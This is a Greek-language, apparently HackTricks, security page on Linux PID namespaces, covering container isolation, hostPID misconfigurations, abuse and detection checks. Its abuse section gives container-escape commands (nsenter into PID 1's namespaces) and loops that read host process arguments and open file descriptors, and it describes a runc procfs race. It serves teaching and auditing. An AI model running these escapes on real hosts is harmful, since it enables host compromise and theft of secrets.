# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το PID namespace ελέγχει πώς αριθμούνται οι διεργασίες και ποιες διεργασίες είναι ορατές. Γι' αυτό ένα container μπορεί να έχει το δικό του PID 1 ακόμη κι αν δεν είναι πραγματική μηχανή. Μέσα στο namespace, το workload βλέπει αυτό που φαίνεται σαν τοπικό δέντρο διεργασιών. Εκτός του namespace, ο host εξακολουθεί να βλέπει τα πραγματικά host PIDs και το πλήρες τοπίο διεργασιών.

Από άποψη ασφάλειας, το PID namespace έχει σημασία επειδή η ορατότητα διεργασιών είναι πολύτιμη. Μόλις ένα workload μπορεί να δει διεργασίες του host, μπορεί να παρατηρήσει ονόματα υπηρεσιών, ορίσματα γραμμής εντολών, μυστικά που περνιούνται ως ορίσματα διεργασιών, κατάσταση που προέρχεται από το περιβάλλον μέσω του `/proc`, και πιθανούς στόχους εισόδου σε namespace. Εάν μπορεί να κάνει κάτι περισσότερο από το απλά να βλέπει αυτές τις διεργασίες — για παράδειγμα να στέλνει σήματα ή να χρησιμοποιεί ptrace υπό τις κατάλληλες συνθήκες — το πρόβλημα γίνεται πολύ πιο σοβαρό.

## Λειτουργία

Ένα νέο PID namespace ξεκινά με τη δική του εσωτερική αρίθμηση διεργασιών. Η πρώτη διεργασία που δημιουργείται μέσα σε αυτό γίνεται PID 1 από την οπτική του namespace, κάτι που σημαίνει επίσης ότι αποκτά ειδικές συμπεριφορές τύπου init για ορφανά παιδιά διεργασιών και στη συμπεριφορά σημάτων. Αυτό εξηγεί πολλές ιδιαιτερότητες container γύρω από τις init διεργασίες, το zombie reaping, και γιατί μικρά init wrappers χρησιμοποιούνται μερικές φορές σε containers.

Το σημαντικό μάθημα ασφάλειας είναι ότι μια διεργασία μπορεί να φαίνεται απομονωμένη επειδή βλέπει μόνο το δικό της δέντρο PID, αλλά αυτή η απομόνωση μπορεί να αφαιρεθεί σκόπιμα. Docker exposes this through `--pid=host`, while Kubernetes does it through `hostPID: true`. Μόλις το container ενταχθεί στο host PID namespace, το workload βλέπει απευθείας τις διεργασίες του host, και πολλά μετέπειτα μονοπάτια επίθεσης γίνονται πολύ πιο ρεαλιστικά.

## Εργαστήριο

Για να δημιουργήσετε χειροκίνητα ένα PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Το shell πλέον βλέπει μια ιδιωτική προβολή διεργασιών. Το flag `--mount-proc` είναι σημαντικό επειδή προσαρτά ένα procfs instance που ταιριάζει με το νέο PID namespace, κάνοντας τη λίστα διεργασιών συνεκτική από το εσωτερικό.

Για να συγκρίνετε τη συμπεριφορά του container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Η διαφορά είναι άμεση και εύκολα κατανοητή, γι' αυτό αυτό είναι ένα καλό πρώτο εργαστήριο για τους αναγνώστες.

## Χρήση κατά την εκτέλεση

Τα κανονικά containers σε Docker, Podman, containerd και CRI-O αποκτούν το δικό τους PID namespace. Τα Kubernetes Pods συνήθως επίσης λαμβάνουν μια απομονωμένη όψη PID, εκτός αν το workload ζητήσει ρητά host PID sharing. Περιβάλλοντα LXC/Incus βασίζονται στο ίδιο kernel primitive, αν και οι χρήσεις system-container μπορεί να εκθέσουν πιο περίπλοκα δέντρα διεργασιών και να ενθαρρύνουν περισσότερα shortcuts για debugging.

Ο ίδιος κανόνας ισχύει παντού: αν το runtime επέλεξε να μην απομονώσει το PID namespace, αυτό αποτελεί σκόπιμη μείωση των ορίων του container.

## Εσφαλμένες διαμορφώσεις

Η κλασική εσφαλμένη διαμόρφωση είναι το host PID sharing. Οι ομάδες συχνά το δικαιολογούν για debugging, monitoring ή ευκολία στη διαχείριση υπηρεσιών, αλλά πρέπει πάντα να θεωρείται μια σημαντική εξαίρεση ασφαλείας. Ακόμα κι αν το container δεν έχει άμεσο write primitive πάνω στις host διεργασίες, η ίδια η ορατότητα μπορεί να αποκαλύψει πολλά για το σύστημα. Μόλις προστεθούν δυνατότητες όπως `CAP_SYS_PTRACE` ή χρήσιμη πρόσβαση σε procfs, ο κίνδυνος επεκτείνεται σημαντικά.

Ένα άλλο λάθος είναι να υποθέσει κανείς ότι επειδή το workload δεν μπορεί από προεπιλογή να kill ή ptrace τις host διεργασίες, το host PID sharing είναι άρα αβλαβές. Αυτό το συμπέρασμα αγνοεί την αξία της enumeration, τη διαθεσιμότητα στόχων για namespace-entry, και τον τρόπο με τον οποίο η ορατότητα PID συνδυάζεται με άλλους αποδυναμωμένους ελέγχους.

## Κατάχρηση

Αν το host PID namespace είναι κοινόχρηστο, ένας επιτιθέμενος μπορεί να εξετάσει τις host διεργασίες, να συλλέξει τα arguments διεργασιών, να εντοπίσει ενδιαφέρουσες υπηρεσίες, να βρει υποψήφια PIDs για `nsenter`, ή να συνδυάσει την ορατότητα διεργασιών με ptrace-related privilege για να παρεμβάλει σε host ή γειτονικά workloads. Σε μερικές περιπτώσεις, η απλή όραση της σωστής μακροχρόνιας διεργασίας αρκεί για να αναδιαμορφώσει το υπόλοιπο σχέδιο επίθεσης.

Το πρώτο πρακτικό βήμα είναι πάντα να επιβεβαιώσεις ότι οι host διεργασίες είναι πραγματικά ορατές:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Μόλις τα host PIDs γίνουν ορατά, τα process arguments και τα namespace-entry targets συχνά αποτελούν την πιο χρήσιμη πηγή πληροφοριών:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Αν το `nsenter` είναι διαθέσιμο και υπάρχουν επαρκή δικαιώματα, δοκιμάστε αν μια ορατή host process μπορεί να χρησιμοποιηθεί ως namespace bridge:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Ακόμα και όταν η είσοδος είναι μπλοκαρισμένη, το host PID sharing είναι ήδη πολύτιμο επειδή αποκαλύπτει τη διάταξη των υπηρεσιών, τα runtime components και τους υποψήφιους privileged processes που θα στοχευτούν στη συνέχεια.

Η ορατότητα του host PID κάνει επίσης την file-descriptor abuse πιο ρεαλιστική. Αν μια privileged host process ή γειτονική workload έχει ανοιχτό ένα ευαίσθητο αρχείο ή socket, ο attacker μπορεί να καταφέρει να ελέγξει το `/proc/<pid>/fd/` και να επαναχρησιμοποιήσει αυτό το handle ανάλογα με την ιδιοκτησία, τα procfs mount options και το target service model.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Αυτές οι εντολές είναι χρήσιμες επειδή απαντούν στο αν το `hidepid=1` ή το `hidepid=2` μειώνει την ορατότητα μεταξύ διεργασιών και στο αν προφανώς ενδιαφέροντα descriptors, όπως open secret files, logs ή Unix sockets, είναι ορατά.

### Πλήρες Παράδειγμα: host PID + `nsenter`

Η κοινή χρήση host PID γίνεται άμεση host escape όταν η διεργασία έχει επίσης αρκετά προνόμια για να ενταχθεί στα host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Εάν η εντολή εκτελεστεί επιτυχώς, η διεργασία του container τώρα εκτελείται στο host mount, UTS, network, IPC, και PID namespaces. Η επίπτωση είναι άμεσο host compromise.

Ακόμα και όταν το `nsenter` αυτό καθαυτό λείπει, το ίδιο αποτέλεσμα μπορεί να επιτευχθεί μέσω του host binary εάν το host filesystem είναι mounted:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Πρόσφατες Σημειώσεις Εκτέλεσης

Κάποιες επιθέσεις σχετικές με PID-namespace δεν είναι οι παραδοσιακές misconfigurations `hostPID: true`, αλλά runtime implementation bugs γύρω από το πώς εφαρμόζονται οι procfs protections κατά τη διαδικασία setup του container.

#### `maskedPaths` αγώνας για host procfs

Σε ευάλωτες εκδόσεις του `runc`, attackers που μπορούν να ελέγξουν το container image ή το `runc exec` workload θα μπορούσαν να κάνουν race τη φάση masking αντικαθιστώντας το container-side `/dev/null` με ένα symlink προς ένα ευαίσθητο procfs path όπως `/proc/sys/kernel/core_pattern`. Εάν ο race ήταν επιτυχής, το masked-path bind mount θα μπορούσε να καταλήξει στον λάθος στόχο και να εκθέσει host-global procfs knobs στο νέο container.

Χρήσιμη εντολή για έλεγχο:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Αυτό είναι σημαντικό γιατί ο τελικός αντίκτυπος μπορεί να είναι ο ίδιος με μια άμεση procfs έκθεση: εγγράψιμο `core_pattern` ή `sysrq-trigger`, που μπορεί να οδηγήσει σε host code execution ή denial of service.

#### Namespace injection with `insject`

Τα εργαλεία Namespace injection όπως το `insject` δείχνουν ότι η αλληλεπίδραση PID-namespace δεν απαιτεί πάντα να εισέλθεις προηγουμένως στο target namespace πριν από τη δημιουργία της διεργασίας. Ένας helper μπορεί να προσαρτηθεί αργότερα, να χρησιμοποιήσει το `setns()`, και να εκτελέσει ενώ διατηρεί την ορατότητα στον target PID space:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Αυτό το είδος τεχνικής έχει σημασία κυρίως για advanced debugging, offensive tooling, και post-exploitation workflows όπου πρέπει να ενωθεί το namespace context μετά την εκκίνηση του workload.

### Σχετικά Πρότυπα Κατάχρησης FD

Δύο μοτίβα αξίζει να επισημανθούν ρητά όταν τα host PIDs είναι ορατά. Πρώτον, μια privileged process μπορεί να κρατήσει έναν sensitive file descriptor ανοικτό κατά το `execve()` επειδή δεν είχε επισημανθεί με `O_CLOEXEC`. Δεύτερον, services μπορεί να περάσουν file descriptors μέσω Unix sockets με `SCM_RIGHTS`. Σε αμφότερες τις περιπτώσεις το ενδιαφέρον αντικείμενο δεν είναι πλέον το pathname, αλλά το ήδη ανοιχτό handle που μια lower-privilege process μπορεί να κληρονομήσει ή να λάβει.

Αυτό έχει σημασία στην εργασία με container γιατί το handle μπορεί να δείχνει στο `docker.sock`, σε ένα privileged log, σε ένα host secret file, ή σε κάποιο άλλο αντικείμενο υψηλής αξίας ακόμη και όταν το path δεν είναι άμεσα προσβάσιμο από το container filesystem.

## Έλεγχοι

Σκοπός αυτών των εντολών είναι να διαπιστωθεί αν η διαδικασία έχει ιδιωτική όψη PID ή αν μπορεί ήδη να απαριθμήσει ένα πολύ ευρύτερο τοπίο process.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
- Αν η λίστα διεργασιών περιέχει εμφανείς υπηρεσίες του host, το host PID sharing πιθανότατα ήδη ισχύει.
- Το να βλέπετε μόνο ένα πολύ μικρό container-local δέντρο είναι ο φυσιολογικός κανόνας; το να βλέπετε `systemd`, `dockerd`, ή άσχετους daemons δεν είναι.
- Μόλις τα host PIDs γίνουν ορατά, ακόμη και πληροφορίες διεργασιών μόνο-ανάγνωσης γίνονται χρήσιμη reconnaissance.

Αν ανακαλύψετε ένα container που τρέχει με host PID sharing, μην το αντιμετωπίζετε ως απλή αισθητική διαφορά. Είναι μια σημαντική αλλαγή στο τι μπορεί να παρατηρήσει και ενδεχομένως να επηρεάσει το workload.
{{#include ../../../../../banners/hacktricks-training.md}}
